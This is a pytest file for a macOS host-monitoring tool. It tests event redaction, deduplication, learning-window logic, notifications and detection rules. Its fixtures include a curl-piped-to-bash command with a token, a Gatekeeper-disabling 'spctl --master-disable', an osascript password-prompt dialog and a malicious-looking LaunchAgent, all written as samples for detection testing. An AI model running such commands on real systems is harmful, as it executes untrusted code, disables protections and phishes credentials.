"""End-to-end: raw records through normalize -> redact -> store -> detect."""

import json

import httpx
from conftest import exec_cols, oq

from bastion.cli import main as cli_main
from bastion.collectors import RawRecord
from bastion.daemon import Pipeline, _next_run, learning_day, sensor_health
from bastion.detect.engine import INSTALL_KEY
from bastion.notify import Notifier, daily_summary_text
from bastion.report import build_report


def test_pipeline_detects_redacts_and_dedupes(cfg, store):
    pipe = Pipeline(cfg, store)
    rec = oq("process_events", exec_cols(
        "/bin/sh", "sh -c curl -fsSL https://x.example/i.sh?token=SUPERSECRET123 | bash"))
    pipe.handle(RawRecord("osquery", rec))
    pipe.handle(RawRecord("osquery", rec))  # same subject within window -> merged
    dets = list(store.iter_detections())
    assert len(dets) == 1 and dets[0]["hits"] == 2
    assert dets[0]["title"] == "Download Piped Into a Shell"
    stored = store.get_event(dets[0]["event_id"])
    blob = json.dumps(stored)
    assert "SUPERSECRET123" not in blob
    assert "abc123abc123" not in blob  # env value from fixture
    assert pipe.stats["events"] == 2


def test_initial_snapshot_never_alerts(cfg, store):
    pipe = Pipeline(cfg, store)
    pipe.handle(RawRecord("osquery", oq("launchd", {
        "path": "/Users/colin/Library/LaunchAgents/com.evil.plist", "label": "com.evil"},
        counter=0)))
    assert list(store.iter_detections()) == []
    pipe.handle(RawRecord("osquery", oq("launchd", {
        "path": "/Users/colin/Library/LaunchAgents/com.evil2.plist", "label": "com.evil2"})))
    assert [d["title"] for d in store.iter_detections()] == [
        "New LaunchAgent, LaunchDaemon or Login Item"]


def test_first_seen_silent_while_learning_then_fires(cfg, store):
    pipe = Pipeline(cfg, store)
    seen = oq("process_events", exec_cols("/Applications/Old.app/Contents/MacOS/Old",
                                          team_id="AAA"))
    pipe.handle(RawRecord("osquery", seen))
    assert list(store.iter_detections()) == []  # learning window
    store.set_state(INSTALL_KEY, "0")  # learning over
    pipe.handle(RawRecord("osquery", seen))  # known -> nothing
    assert list(store.iter_detections()) == []
    pipe.handle(RawRecord("osquery", oq("process_events", exec_cols(
        "/Applications/New.app/Contents/MacOS/New", team_id="BBB"))))
    pipe.handle(RawRecord("osquery", oq("process_events", exec_cols(
        "/Users/colin/git/proj/target/debug/app"))))  # built locally -> never
    titles = [d["title"] for d in store.iter_detections()]
    assert titles == ["First-seen non-Apple binary executed"]


def test_live_push_only_in_high_live_mode(cfg, store):
    sent = []
    transport = httpx.MockTransport(lambda req: sent.append(req) or httpx.Response(200))
    cfg.notify.ntfy_topic = "t"
    cfg.notify.mode = "high_live"
    pipe = Pipeline(cfg, store, Notifier(cfg, httpx.Client(transport=transport)))
    pipe.handle(RawRecord("osquery", oq("process_events", exec_cols(
        "/usr/sbin/spctl", "spctl --master-disable", platform=1))))
    assert len(sent) == 1
    body = sent[0].content.decode()
    assert "/usr/sbin/spctl" not in body  # no paths over public ntfy
    assert sent[0].headers["Priority"] == "high"


def test_daily_summary_and_report(cfg, store):
    pipe = Pipeline(cfg, store)
    for path in ("/private/tmp/a", "/private/tmp/b"):
        pipe.handle(RawRecord("osquery", oq("process_events", exec_cols(path))))
    text = daily_summary_text(store, learning_day(store), 14, sensor_health(cfg, store))
    assert "learning day 1 of 14" in text
    assert "Execution From a Temporary or Shared Folder x2" in text
    assert "/private/tmp" not in text
    report = build_report(store, days=7)
    assert "[medium] Execution From a Temporary or Shared Folder" in report
    assert "- [ ] benign  [ ] real" in report


def test_sensor_health_states(cfg, store):
    assert sensor_health(cfg, store, now_ms=10**9)["osquery"] == "no data yet"
    store.set_state("last_seen.osquery", str(10**9))
    assert sensor_health(cfg, store, now_ms=10**9 + 1000)["osquery"] == "ok"
    assert sensor_health(cfg, store, now_ms=10**9 + 3_600_000)["osquery"].startswith("silent")


def test_next_run_rolls_to_tomorrow():
    from datetime import datetime
    now = datetime(2026, 10, 31, 9, 0)
    assert _next_run("08:30", now) == datetime(2026, 11, 1, 8, 30)
    assert _next_run("10:00", now) == datetime(2026, 10, 31, 10, 0)


def test_cli_replay_fixture(tmp_path, capsys):
    f = tmp_path / "osq.log"
    f.write_text("\n".join(json.dumps(oq("process_events", exec_cols(p, c, platform=pb)))
                           for p, c, pb in [
                               ("/usr/bin/osascript",
                                'osascript -e display dialog "x" with hidden answer', 1),
                               ("/bin/ls", "ls", 1)]))
    assert cli_main(["--config", str(tmp_path / "none.toml"), "replay", "osquery",
                     str(f)]) == 0
    out = capsys.readouterr().out
    assert "AppleScript Dialog Asking for a Password" in out


def test_cli_rules(capsys):
    assert cli_main(["rules"]) == 0
    assert "15 rules loaded, 0 errors" in capsys.readouterr().out
